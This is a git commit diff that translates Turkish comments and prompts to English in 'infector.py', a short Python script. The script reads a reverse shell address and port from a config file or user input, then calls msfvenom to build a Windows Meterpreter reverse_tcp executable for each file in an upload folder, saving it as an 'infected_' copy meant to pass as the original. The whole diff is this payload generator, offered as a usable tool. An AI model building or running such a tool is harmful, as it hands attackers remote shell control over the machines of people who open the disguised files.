bbe3c2d69ce68b5adacf8336e07afec06b4b1865
Furkan Karayigit <117169756+FurkanKrygt@users.noreply.github.com>
2024-10-01 21:52:56 +0300

    Update infector.py

--- infector.py
+++ infector.py
@@ -1,20 +1,20 @@
 import os
 import subprocess
 
-# Dosya yolları
+# File paths
 upload_dir = "upload"
 infected_dir = "infected"
 config_file = "config.fkn"
 
-# Reverse shell bilgilerini al
+# Get reverse shell information
 def get_reverse_shell():
     if os.path.exists(config_file):
         with open(config_file, "r") as file:
             return file.read().strip()
     else:
-        return input("Reverse shell bağlantı adresini gir (örn. 192.168.1.100:4444): ")
+        return input("Enter the reverse shell connection address (example: 192.168.1.100:4444): ")
 
-# Dosyaları enfekte et ve infected klasörüne kaydet
+# Infect files and save them in the infected folder
 def infect_files():
     if not os.path.exists(infected_dir):
         os.makedirs(infected_dir)
@@ -25,11 +25,11 @@ def infect_files():
         file_path = os.path.join(upload_dir, filename)
         if os.path.isfile(file_path):
             output_file = os.path.join(infected_dir, f"infected_{filename}")
-            # msfvenom komutu ile dosyayı enfekte et
+            # Infect the file with the msfvenom command
             command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={reverse_shell.split(':')[0]} LPORT={reverse_shell.split(':')[1]} -f exe -o {output_file}"
-            print(f"{filename} dosyası enfekte ediliyor...")
+            print(f"{filename} file is infected...")
             subprocess.run(command, shell=True)
-            print(f"Enfekte edilmiş dosya: {output_file}")
+            print(f"Infected file: {output_file}")
 
 if __name__ == "__main__":
     infect_files()
